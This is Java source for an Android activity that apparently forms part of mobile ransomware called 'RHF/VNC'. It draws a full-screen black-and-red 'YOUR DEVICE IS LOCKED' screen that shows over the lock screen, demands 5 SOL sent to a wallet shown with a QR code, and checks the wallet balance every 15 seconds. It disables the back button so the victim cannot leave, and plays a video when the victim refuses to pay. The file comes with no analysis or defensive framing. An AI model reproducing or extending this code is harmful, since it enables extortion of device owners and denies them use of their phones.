package com.rhfvnc.strain;
import android.app.Activity;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.*;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
public class PaywallActivity extends Activity {
    public static volatile boolean paid = false;
    public static volatile boolean rejected = false;
    private TextView status;
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        if (paid) { launchVideo(); return; }
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.BLACK);
        root.setGravity(Gravity.CENTER);
        root.setPadding(48, 48, 48, 48);

        TextView title = new TextView(this);
        title.setText("RHF/VNC");
        title.setTextColor(Color.RED);
        title.setTextSize(48);
        title.setGravity(Gravity.CENTER);
        root.addView(title);

        TextView sub = new TextView(this);
        sub.setText("YOUR DEVICE IS LOCKED");
        sub.setTextColor(Color.RED);
        sub.setTextSize(18);
        sub.setGravity(Gravity.CENTER);
        sub.setPadding(0, 8, 0, 32);
        root.addView(sub);

        ImageView qr = new ImageView(this);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(500, 500);
        qr.setLayoutParams(lp);
        root.addView(qr);
        loadQr(qr);

        TextView addr = new TextView(this);
        addr.setText("Send 5 SOL to:\n" + SolanaCheck.WALLET);
        addr.setTextColor(Color.WHITE);
        addr.setTextSize(13);
        addr.setGravity(Gravity.CENTER);
        addr.setPadding(0, 24, 0, 24);
        root.addView(addr);

        status = new TextView(this);
        status.setText("Waiting for payment...");
        status.setTextColor(Color.YELLOW);
        status.setTextSize(16);
        status.setGravity(Gravity.CENTER);
        status.setPadding(0, 16, 0, 32);
        root.addView(status);

        Button verify = new Button(this);
        verify.setText("I PAID — CHECK");
        verify.setOnClickListener(v -> checkNow());
        root.addView(verify);

        Button reject = new Button(this);
        reject.setText("REJECT — I WILL NOT PAY");
        reject.setTextColor(Color.RED);
        reject.setOnClickListener(v -> {
            rejected = true;
            launchVideo();
        });
        root.addView(reject);

        setContentView(root);

        // auto-check tiap 15 detik
        new Thread(() -> {
            while (!paid && !rejected) {
                try { Thread.sleep(15000); } catch (InterruptedException ignored) {}
                if (paid || rejected) break;
                final long bal = SolanaCheck.getBalance();
                runOnUiThread(() -> {
                    if (bal >= 0) status.setText("Balance: " + (bal / 1_000_000_000.0) + " SOL / 5 SOL");
                });
                if (bal >= SolanaCheck.REQUIRED_LAMPORTS) {
                    paid = true;
                    runOnUiThread(() -> status.setText("PAID — UNLOCKING"));
                    try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
                    runOnUiThread(() -> {
                        Toast.makeText(PaywallActivity.this, "UNLOCKED", Toast.LENGTH_LONG).show();
                        finishAffinity();
                        android.os.Process.killProcess(android.os.Process.myPid());
                    });
                    return;
                }
            }
        }).start();
    }
    private void checkNow() {
        new Thread(() -> {
            long bal = SolanaCheck.getBalance();
            runOnUiThread(() -> status.setText(bal >= 0
                    ? "Balance: " + (bal / 1_000_000_000.0) + " SOL / 5 SOL"
                    : "RPC error — try again"));
            if (bal >= SolanaCheck.REQUIRED_LAMPORTS) {
                paid = true;
                runOnUiThread(() -> {
                    Toast.makeText(PaywallActivity.this, "UNLOCKED", Toast.LENGTH_LONG).show();
                    finishAffinity();
                    android.os.Process.killProcess(android.os.Process.myPid());
                });
            }
        }).start();
    }
    private void loadQr(ImageView iv) {
        new Thread(() -> {
            try {
                String url = "https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=" + SolanaCheck.WALLET;
                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                c.setConnectTimeout(8000);
                c.setReadTimeout(8000);
                InputStream in = c.getInputStream();
                Bitmap bm = BitmapFactory.decodeStream(in);
                in.close();
                runOnUiThread(() -> iv.setImageBitmap(bm));
            } catch (Throwable ignored) {}
        }).start();
    }
    private void launchVideo() {
        Intent i = new Intent(this, VideoActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(i);
        finish();
    }
    @Override
    public void onBackPressed() {
        // nggak bisa keluar
        launchVideo();
    }
}
